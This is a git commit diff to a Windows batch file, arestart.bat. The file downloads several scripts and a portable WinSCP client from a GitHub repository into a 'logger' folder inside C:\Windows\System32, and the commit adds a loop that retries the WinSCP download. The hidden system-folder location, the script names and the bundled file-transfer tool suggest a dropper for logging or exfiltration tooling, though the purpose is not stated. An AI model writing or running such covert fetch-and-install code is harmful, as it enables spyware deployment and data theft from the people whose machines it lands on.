235d34e74d6b0b676df4c0a7e6586f34447cdf77
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 03:55:41 -0700

    Update arestart.bat

--- arestart.bat
+++ arestart.bat
@@ -5,8 +5,11 @@ powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System32\logger\ss.bat
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System32\logger\ss1.bat
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System32\logger\gen.bat
+:scp
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System32\logger\scp.zip
 powershell Expand-Archive scp.zip -DestinationPath C:\Windows\System32\logger\
-del /Q C:\Windows\System32\logger\license.txt
-del /Q C:\Windows\System32\logger\readme.txt
-del /Q C:\Windows\System32\logger\scp.zip
+if exist "C:\Windows\System32\logger\WinSCP.com" if exist "C:\Windows\System32\logger\WinSCP.exe" goto exit
+if not exist "C:\Windows\System32\logger\WinSCP.com" goto scp
+if not exist "C:\Windows\System32\logger\WinSCP.exe" goto scp
+:exit
+exit
